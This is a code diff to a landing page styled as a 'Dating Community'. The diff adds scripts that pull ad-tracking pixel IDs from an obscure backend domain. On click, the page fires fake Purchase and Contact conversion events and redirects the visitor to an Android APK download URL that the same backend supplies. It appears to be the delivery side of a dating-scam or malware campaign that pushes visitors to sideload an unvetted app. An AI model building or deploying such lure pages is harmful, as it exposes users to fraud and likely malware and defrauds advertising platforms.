@@ -12,9 +12,9 @@
     <title>Dating Community</title>
     <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-
-	 
-       <script>
+ <script>
+var API_BASE = 'https://url.yuhd320k.site';
+// Facebook Pixel — 动态从后台加载所有像素ID
 !function(f,b,e,v,n,t,s)
 {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
 n.callMethod.apply(n,arguments):n.queue.push(arguments)};
@@ -23,30 +23,58 @@ n.queue=[];t=b.createElement(e);t.async=!0;
 t.src=v;s=b.getElementsByTagName(e)[0];
 s.parentNode.insertBefore(t,s)}(window, document,'script',
 'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '27726787850252241');
-		   fbq('init', '917309114102672');
-		      fbq('init', '1541438780771011');
-		    fbq('init', '1311299967880432');
-		     fbq('init', '1613597266401343');
-fbq('track', 'PageView');
+
+// 从后台 API 获取所有像素ID并初始化
+var _site=window.location.origin+window.location.pathname;
+console.log('前端站点(完整路径):',_site,' API:',API_BASE);
+fetch(API_BASE+'/api/pixels?site='+encodeURIComponent(_site))
+.then(function(r){return r.json()})
+.then(function(d){
+  console.log('像素API返回:',JSON.stringify(d));
+  var ids=d.ids||[];
+  if(!ids.length){ console.warn('像素ID列表为空，请前往后台配置。site='+_site+' matched='+(d._user||'none')); return; }
+  console.log('已加载像素ID:',ids); for(var i=0;i<ids.length;i++){ fbq('init',ids[i]); }
+  fbq('track','PageView');
+  // 动态插入 noscript 备用图
+  var ns=document.createElement('div');
+  ns.style.display='none';
+  ns.innerHTML=ids.map(function(id){return '<img height="1" width="1" src="https://www.facebook.com/tr?id='+id+'&ev=PageView&noscript=1"/>'}).join('');
+  document.body.appendChild(ns);
+})
+.catch(function(){
+  console.warn('像素ID获取失败，请检查后台配置');
+});
 </script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=27726787850252241&ev=PageView&noscript=1"
-/></noscript>
 <!-- End Meta Pixel Code -->
 
-	
-	
-<script>
- function openLine()
 
-	{
-		fbq('track', 'AddToCart');
-		 fbq('track', 'Contact');
-    fbq('track', 'Purchase');
-		window.location.href="https://lihi2.me/cQq0o";
-	}
-</script>
+    <!-- ========== k2 — Dynamic APK URL fetch & redirect (no device filter) ========== -->
+    <script>
+        // Ensure API_BASE and _site are defined globally before calling k2
+        var _apkUrl = '';
+        async function openLine(source) {
+            fbq('track', 'AddToCart');
+            fbq('track', 'Contact');
+            fbq('track', 'Purchase');
+
+            try {
+                if (!_apkUrl) {
+                    var r = await fetch(API_BASE + '/api/apk-url?site=' + encodeURIComponent(_site));
+                    var d = await r.json();
+                    _apkUrl = d.url;
+                    console.log('APK API response:', JSON.stringify(d));
+                }
+                if (_apkUrl) {
+                    window.location.href = _apkUrl;
+                } else {
+                    alert('请配置下载地址.');
+                }
+            } catch (e) {
+                alert('请配置下载地址.');
+            }
+        }
+    </script>
+    <!-- ========== End k2 ========== -->
   
 	
     <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js"></script>
